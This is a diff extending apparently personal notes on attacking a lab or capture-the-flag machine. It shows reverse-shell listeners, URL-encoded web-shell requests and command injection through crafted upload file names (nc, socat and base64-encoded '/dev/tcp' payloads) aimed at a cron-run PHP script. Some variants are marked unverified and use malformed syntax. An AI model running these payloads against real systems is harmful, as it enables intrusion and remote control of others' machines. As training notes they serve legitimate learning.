@@ -247,6 +247,8 @@ urlencode "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1"
 
 # listen
 nc -lvnp 4242
+# rlwrap removes line wraps i.e. truncated lines when C&P in the shell
+rlwrap nc -lvnp 4242
 # open reverse shell
 http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
 http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261
@@ -256,6 +258,7 @@ Upgrade shell
 
 * [Pimp My Shell](https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)
 * [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)
+* [Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell) (see `rlwrap`)
 
 ```bash
 # run inside reverse shell
@@ -276,3 +279,60 @@ ENTER
 # to be able to run "clear"
 export TERM=xterm
 ```
+
+### Lateral Movement
+
+Explore user folders
+```bash
+# home path
+cd /home/guly
+
+# leverage cron to privesc
+cat crontab.guly 
+*/3 * * * * php /home/guly/check_attack.php
+
+# -w: disable line wrapping
+base64 -w 0 /home/guly/check_attack.php; echo
+# copy locally for investigation
+PD9waHAKcmVxdWlyZSAnL3Zhci93d3cvaHRtbC9saWIucGhwJzsKJHBhdGggPSAnL3Zhci93d3cvaHRtbC91cGxvYWRzLyc7CiRsb2dwYXRoID0gJy90bXAvYXR0YWNrLmxvZyc7CiR0byA9ICdndWx5JzsKJG1zZz0gJyc7CiRoZWFkZXJzID0gIlgtTWFpbGVyOiBjaGVja19hdHRhY2sucGhwXHJcbiI7CgokZmlsZXMgPSBhcnJheSgpOwokZmlsZXMgPSBwcmVnX2dyZXAoJy9eKFteLl0pLycsIHNjYW5kaXIoJHBhdGgpKTsKCmZvcmVhY2ggKCRmaWxlcyBhcyAka2V5ID0+ICR2YWx1ZSkgewoJJG1zZz0nJzsKICBpZiAoJHZhbHVlID09ICdpbmRleC5odG1sJykgewoJY29udGludWU7CiAgfQogICNlY2hvICItLS0tLS0tLS0tLS0tXG4iOwoKICAjcHJpbnQgImNoZWNrOiAkdmFsdWVcbiI7CiAgbGlzdCAoJG5hbWUsJGV4dCkgPSBnZXRuYW1lQ2hlY2soJHZhbHVlKTsKICAkY2hlY2sgPSBjaGVja19pcCgkbmFtZSwkdmFsdWUpOwoKICBpZiAoISgkY2hlY2tbMF0pKSB7CiAgICBlY2hvICJhdHRhY2shXG4iOwogICAgIyB0b2RvOiBhdHRhY2ggZmlsZQogICAgZmlsZV9wdXRfY29udGVudHMoJGxvZ3BhdGgsICRtc2csIEZJTEVfQVBQRU5EIHwgTE9DS19FWCk7CgogICAgZXhlYygicm0gLWYgJGxvZ3BhdGgiKTsKICAgIGV4ZWMoIm5vaHVwIC9iaW4vcm0gLWYgJHBhdGgkdmFsdWUgPiAvZGV2L251bGwgMj4mMSAmIik7CiAgICBlY2hvICJybSAtZiAkcGF0aCR2YWx1ZVxuIjsKICAgIG1haWwoJHRvLCAkbXNnLCAkbXNnLCAkaGVhZGVycywgIi1GJHZhbHVlIik7CiAgfQp9Cgo/Pgo=
+# output locally
+echo "<BASE64_VALUE>" | base64 -d > check_attack.php
+# line 29: control $value - filename '/var/www/html/uploads/'
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+
+# avoid reusing netcat on the same PORT: once the connection is open sometimes it won't listen anymore
+# replacement for netstat
+ss -lnp | grep 4242
+
+# test connection: ALWAYS use v (verbose) to se a prompt when it connects
+# listen from attacking machine
+nc -lvnp 4444
+# exec in "apache" shell
+nc -c bash 10.10.14.14 4444
+
+# create malicious filename without slashes
+cd /var/www/html/uploads/
+
+# -- means no arguments
+touch -- ';nc -c bash 10.10.14.14 4242;.php'
+
+# alternative
+touch "; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.14:4242"
+
+# alternative (to verify)
+echo -n 'bash -c "bash -i >/dev/tcp/10.10.14.14:4242 0>&1"' | base64
+# YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYxIg==
+touch ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYxIg== | base64 -d | bash'
+
+# alternative (to verify)
+base64py "bash -i >/dev/tcp/10.10.14.14:4242 0>&1"
+# b'YmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYx'
+touch ';echo YmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYx | base64 -d | bash'
+
+# wait for the cronjob to run every 3 mins
+date
+nc -lvnp 4242
+socat file:`tty`,raw,echo=0 tcp-listen:4242
+```
+
+### Privilege Escalation
